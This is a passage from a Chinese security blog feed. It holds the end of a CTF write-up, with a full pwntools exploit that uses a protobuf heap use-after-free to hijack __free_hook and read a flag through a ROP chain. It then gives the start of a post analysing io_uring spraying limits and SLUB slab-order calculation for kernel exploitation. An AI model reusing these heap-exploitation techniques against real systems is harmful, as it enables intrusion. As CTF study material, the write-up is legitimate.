class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">idx, size, content=<span class="string">b&#x27;&#x27;</span></span>):</span></span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">1</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = size</span><br><span class="line">    msg.msgcontent = content</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">2</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = content</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">3</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">4</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    create(i, <span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">7</span>-i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recv(<span class="number">0x50</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base =&gt; &quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">heap_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x590</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base =&gt; &quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">__free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">open_addr = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_addr = libc_base + libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ret_addr = libc_base + <span class="number">0x0000000000022679</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line">magic_gadget = libc_base + <span class="number">0x151990</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, flat(__free_hook, <span class="number">0</span>))</span><br><span class="line">create(<span class="number">8</span>, <span class="number">0xf0</span>)</span><br><span class="line">create(<span class="number">9</span>, <span class="number">0xf0</span>, flat(magic_gadget))</span><br><span class="line"></span><br><span class="line">flag_addr = heap_base + <span class="number">0x440</span></span><br><span class="line"></span><br><span class="line">rop_chain = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop_chain += flat(pop_rdi, flag_addr, pop_rsi, <span class="number">2</span>, open_addr)</span><br><span class="line">rop_chain += flat(pop_rdi, <span class="number">3</span>, pop_rsi, libc_base +</span><br><span class="line">                  libc.bss() + <span class="number">0x500</span>, pop_rdx, <span class="number">0x50</span>, read_addr)</span><br><span class="line">rop_chain += flat(pop_rdi, libc_base + libc.bss() + <span class="number">0x500</span>, puts_addr)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;./flag&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>, flag_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + flat(setcontext)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>) + rop_chain</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + flat(flag_addr + <span class="number">0x28</span>, ret_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>, payload)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><hr><p>参考链接：</p><p>​    <a class="link"   href="https://xp0int.top/posts/2023/05/28/2023-CISCN-%E5%88%9D%E8%B5%9B-Writeup-By-Xp0int/#42-strangetalkbot" >https://xp0int.top/posts/2023/05/28/2023-CISCN-%E5%88%9D%E8%B5%9B-Writeup-By-Xp0int/#42-strangetalkbot<i class="fas fa-external-link-alt"></i></a></p><p>​    <a class="link"   href="https://github1s.com/protobuf-c/protobuf-c/blob/HEAD/protobuf-c/protobuf-c.c#L3028" >https://github1s.com/protobuf-c/protobuf-c/blob/HEAD/protobuf-c/protobuf-c.c#L3028<i class="fas fa-external-link-alt"></i></a></p><p>​    <a class="link"   href="https://www.jianshu.com/p/a7e88cb17031" >https://www.jianshu.com/p/a7e88cb17031<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;其实在以前已经多次遇见过&lt;code&gt;protobuf&lt;/code&gt;了，但是都不太在意因为总感觉会像musl库一样，存活一段时间后就消失了。所</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="UAF" scheme="https://cv196082.gitee.io/tags/UAF/"/>
    
    <category term="protobuf" scheme="https://cv196082.gitee.io/tags/protobuf/"/>
    
  </entry>
  
  <entry>
    <title>向pipe_buffer说yes！</title>
    <link href="https://cv196082.gitee.io/2023/05/24/pipe-buffer/"/>
    <id>https://cv196082.gitee.io/2023/05/24/pipe-buffer/</id>
    <published>2023-05-24T08:39:35.000Z</published>
    <updated>2023-05-24T08:39:41.227Z</updated>
    
    <content type="html"><![CDATA[<p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230510125707322.png"                      alt="image-20230510125707322"                ></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>起因是墨晚鸢大佬的一句回复，不过我这里还没尝试挖掘新的东西，更多的是对墨晚鸢佬的内容做适合自己理解的总结。可以看到标签中还有一个上一篇文章主要介绍的<code>io_uring</code>，这里就先说说。</p><p><del>万字警告！！！</del></p><h2 id="io-uring在堆喷中的局限性"><a href="#io-uring在堆喷中的局限性" class="headerlink" title="io_uring在堆喷中的局限性"></a>io_uring在堆喷中的局限性</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __io_account_mem(struct user_struct *user, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> page_limit, cur_pages, new_pages;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nr_pages)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Don&#x27;t allow more pages than we can safely lock */</span></span><br><span class="line">page_limit = rlimit(RLIMIT_MEMLOCK) &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">cur_pages = atomic_long_read(&amp;user-&gt;locked_vm);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">new_pages = cur_pages + nr_pages;</span><br><span class="line"><span class="keyword">if</span> (new_pages &gt; page_limit)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125; <span class="keyword">while</span> (!atomic_long_try_cmpxchg(&amp;user-&gt;locked_vm,</span><br><span class="line">  &amp;cur_pages, new_pages));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在我进行一次堆喷过后，并使用update去修改内容是会返回错误-12，则是在上面的函数中，<code>new_page</code>超过了可以安全lock的page数量，也就是<code>new_pages &gt; page_limit</code>导致的。</p><p>而上面这个函数最初是由<code>io_sqe_buffer_register</code>函数调用的，所以不幸的是在对<code>io_uring</code>进行分配的时候就要开始考虑了。所以在我们平时动不动就要面对4096次之类的大范围堆喷时<code>io_uring</code>就显得有点儿力不从心了。</p><p>不过除了以上这样一点缺点<code>io_uring</code>的表现依旧是令人满意的。</p><h2 id="slab分配源码分析"><a href="#slab分配源码分析" class="headerlink" title="slab分配源码分析"></a>slab分配源码分析</h2><p>众所周知，分配slab的机制为<code>buddy system</code>机制进行的。而进行分配的最终函数为<code>alloc_slab_page</code>函数进行分配，并且大家都知道<code>buddy system</code>分配时大小为<code>PAGE_SIZE * pow(2,order)</code>，所以order的由来就显得尤为重要了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">oo_order</span><span class="params">(struct kmem_cache_order_objects x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> x.x &gt;&gt; OO_SHIFT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct slab *<span class="title">alloc_slab_page</span><span class="params">(<span class="keyword">gfp_t</span> flags, <span class="keyword">int</span> node,</span></span></span><br><span class="line"><span class="params"><span class="function">struct kmem_cache_order_objects oo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">folio</span> *<span class="title">folio</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order = oo_order(oo);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (node == NUMA_NO_NODE)</span><br><span class="line">folio = (struct folio *)alloc_pages(flags, order);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">folio = (struct folio *)__alloc_pages_node(node, flags, order);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!folio)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">slab = folio_slab(folio);</span><br><span class="line">__folio_set_slab(folio);</span><br><span class="line"><span class="comment">/* Make the flag visible before any changes to folio-&gt;mapping */</span></span><br><span class="line">smp_wmb();</span><br><span class="line"><span class="keyword">if</span> (page_is_pfmemalloc(folio_page(folio, <span class="number">0</span>)))</span><br><span class="line">slab_set_pfmemalloc(slab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> slab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在<code>alloc_slab_page</code>函数中使用order是在oo中，而这个oo这时<code>kmem_cache</code>结构体中的成员。</p><h3 id="kmem-cache-create-usercopy流程"><a href="#kmem-cache-create-usercopy流程" class="headerlink" title="kmem_cache_create_usercopy流程"></a>kmem_cache_create_usercopy流程</h3><p><code>kmem_cache_create_usercopy</code>用来注册一个cache，所以他也会分配一个slab供他自己使用，不过分配的时间点是在这个cache中第一次申请object的时候触发的。而<code>kmem_cache_create_usercopy</code>函数主要是对slab的初始化，其中就包括了我们比较关注的<code>order</code>了。</p><p>因为前半部分的函数都没有直接和<code>order</code>产生关系，所以这里就给一下大家调用连不贴源码占篇幅了。</p><p><code>kmem_cache_create_usercopy</code>=&gt;<code>create_cache</code>=&gt;<code>__kmem_cache_create</code>=&gt;<code>kmem_cache_open</code>=&gt;<code>calculate_sizes</code></p><h4 id="calculate-sizes函数"><a href="#calculate-sizes函数" class="headerlink" title="calculate_sizes函数"></a>calculate_sizes函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">calculate_sizes</span><span class="params">(struct kmem_cache *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">slab_flags_t</span> flags = s-&gt;flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size = s-&gt;object_size;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line">order = calculate_order(size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">int</span>)order &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">s-&gt;allocflags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (order)</span><br><span class="line">s-&gt;allocflags |= __GFP_COMP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; SLAB_CACHE_DMA)</span><br><span class="line">s-&gt;allocflags |= GFP_DMA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; SLAB_CACHE_DMA32)</span><br><span class="line">s-&gt;allocflags |= GFP_DMA32;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; SLAB_RECLAIM_ACCOUNT)</span><br><span class="line">s-&gt;allocflags |= __GFP_RECLAIMABLE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Determine the number of objects per slab</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">s-&gt;oo = oo_make(order, size);</span><br><span class="line">s-&gt;min = oo_make(get_order(size), size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> !!oo_objects(s-&gt;oo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在函数最后这部分就是对oo的赋值，所以理所应当去<code>calculate_order</code>理清逻辑。</p><h4 id="calculate-order函数"><a href="#calculate-order函数" class="headerlink" title="calculate_order函数"></a>calculate_order函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">calculate_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> min_objects;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> max_objects;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nr_cpus;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to find best configuration for a slab. This</span></span><br><span class="line"><span class="comment"> * works by first attempting to generate a layout with</span></span><br><span class="line"><span class="comment"> * the best configuration and backing off gradually.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * First we increase the acceptable waste in a slab. Then</span></span><br><span class="line"><span class="comment"> * we reduce the minimum objects required in a slab.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">min_objects = slub_min_objects;</span><br><span class="line"><span class="keyword">if</span> (!min_objects) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Some architectures will only update present cpus when</span></span><br><span class="line"><span class="comment"> * onlining them, so don&#x27;t trust the number if it&#x27;s just 1. But</span></span><br><span class="line"><span class="comment"> * we also don&#x27;t want to use nr_cpu_ids always, as on some other</span></span><br><span class="line"><span class="comment"> * architectures, there can be many possible cpus, but never</span></span><br><span class="line"><span class="comment"> * onlined. Here we compromise between trying to avoid too high</span></span><br><span class="line"><span class="comment"> * order on systems that appear larger than they are, and too</span></span><br><span class="line"><span class="comment"> * low order on systems that appear smaller than they are.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">nr_cpus = num_present_cpus();</span><br><span class="line"><span class="keyword">if</span> (nr_cpus &lt;= <span class="number">1</span>)</span><br><span class="line">nr_cpus = nr_cpu_ids;</span><br><span class="line">min_objects = <span class="number">4</span> * (fls(nr_cpus) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">max_objects = order_objects(slub_max_order, size);</span><br><span class="line">min_objects = min(min_objects, max_objects);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (min_objects &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> fraction;</span><br><span class="line"></span><br><span class="line">fraction = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">while</span> (fraction &gt;= <span class="number">4</span>) &#123;</span><br><span class="line">order = calc_slab_order(size, min_objects,</span><br><span class="line">slub_max_order, fraction);</span><br><span class="line"><span class="keyword">if</span> (order &lt;= slub_max_order)</span><br><span class="line"><span class="keyword">return</span> order;</span><br><span class="line">fraction /= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">min_objects--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We were unable to place multiple objects in a slab. Now</span></span><br><span class="line"><span class="comment"> * lets see if we can place a single object there.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">order = calc_slab_order(size, <span class="number">1</span>, slub_max_order, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (order &lt;= slub_max_order)</span><br><span class="line"><span class="keyword">return</span> order;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Doh this slab cannot be placed using slub_max_order.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">order = calc_slab_order(size, <span class="number">1</span>, MAX_ORDER, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (order &lt; MAX_ORDER)</span><br><span class="line"><span class="keyword">return</span> order;</span><br><span class="line"><span class="keyword">return</span> -ENOSYS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以注意到最终的order是由<code>calc_slab_order</code>函数生成的。而这里的<code>min_objects</code>变量可以看到是由<code>slub_min_objects</code>赋值的。这个全局变量的含义是：每个slab的最小object数量，在没有配置的情况下是0。不过可以看到如果是0的话会进入到紧接着的if语句内，内部的<code>nr_cpu_ids</code>变量的值是处理器数。fls 可以获取参数的最高有效 bit 的位数，比如 fls(0)=0，fls(1)=1，fls(4) = 3。如果当前系统中有4个cpu，那么 min_object 的初始值为 4*(3+1) = 16。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">~ cat /proc/kallsyms | grep slub_min_objects</span><br><span class="line">ffffffff8a23b2d0 t __cfi_setup_slub_min_objects</span><br><span class="line">ffffffff8a23b2e0 t setup_slub_min_objects</span><br><span class="line">ffffffff8a4348af t __setup_str_setup_slub_min_objects</span><br><span class="line">ffffffff8a45e460 t __setup_setup_slub_min_objects</span><br><span class="line">ffffffff8b3d5fbc b slub_min_objects</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/1xw 0xffffffff8b3d5fbc</span><br><span class="line">0xffffffff8b3d5fbc:0x00000000</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">~ cat /proc/kallsyms | grep nr_cpu_ids</span><br><span class="line">ffffffff97f73fa8 D nr_cpu_ids</span><br><span class="line">ffffffff98025f10 T __cfi_setup_nr_cpu_ids</span><br><span class="line">ffffffff98025f20 T setup_nr_cpu_ids</span><br><span class="line">ffffffff990f3098 b rcu_init_geometry.old_nr_cpu_ids</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/1xw 0xffffffff97f73fa8</span><br><span class="line">0xffffffff97f73fa8:0x00000004</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><p>按照上述步骤查看之后可以看到<code>nr_cpu_ids</code>的值为4，所以这里的<code>min_object</code>的值为<code>0x10</code>。</p><p>而函数中<code>fraction</code>是对于碎片的一种指标。碎片大小不能超过 (slab所占内存大小 / fraction)，fraction 值越大，slab 中所能容忍的碎片就越小。</p><h4 id="calc-slab-order函数"><a href="#calc-slab-order函数" class="headerlink" title="calc_slab_order函数"></a>calc_slab_order函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ilog2</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> l = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ((<span class="number">1UL</span> &lt;&lt; l) &lt; v)</span><br><span class="line">l++;</span><br><span class="line"><span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline __attribute_const__ <span class="keyword">int</span> <span class="title">get_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (__builtin_constant_p(size)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!size)</span><br><span class="line"><span class="keyword">return</span> BITS_PER_LONG - PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &lt; (<span class="number">1UL</span> &lt;&lt; PAGE_SHIFT))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ilog2((size) - <span class="number">1</span>) - PAGE_SHIFT + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">size--;</span><br><span class="line">size &gt;&gt;= PAGE_SHIFT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> BITS_PER_LONG == 32</span></span><br><span class="line"><span class="keyword">return</span> fls(size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">return</span> fls64(size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">calc_slab_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> min_objects, <span class="keyword">unsigned</span> <span class="keyword">int</span> max_order,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> 